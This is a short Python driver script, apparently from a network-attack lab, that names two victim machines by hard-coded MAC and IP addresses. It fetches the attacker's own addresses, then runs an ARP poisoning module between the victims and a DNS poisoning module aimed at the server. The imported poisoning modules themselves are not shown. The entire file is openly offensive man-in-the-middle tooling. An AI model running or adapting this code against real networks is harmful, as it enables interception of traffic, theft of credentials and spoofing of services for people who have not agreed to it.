from arppoisoning import ArpPoisoning
from getmacipattacker import GetIpMac
from dnspoisoning import DnsPoisoning

#victim1
macWindows = "08:00:27:b7:c4:af"
ipWindows = "192.168.56.101"

#victim2
macServer = "08:00:27:cc:08:6f"
ipServer = "192.168.56.102"

global mac_attacker
global ip_attacker

if __name__ == "__main__":
    get_ip_mac_module = GetIpMac()
    mac_ip_attacker = get_ip_mac_module.get_mac_ip()
    mac_attacker = mac_ip_attacker[0]
    ip_attacker = mac_ip_attacker[1]

    arp_poisoning_module = ArpPoisoning(ipWindows, ipServer, mac_attacker, ip_attacker)
    arp_poisoning_module.execute_poisoning()

    dns_poisoning_module = DnsPoisoning(mac_attacker, ip_attacker, "192.168.56.102")
    dns_poisoning_module.execute_poisoning()


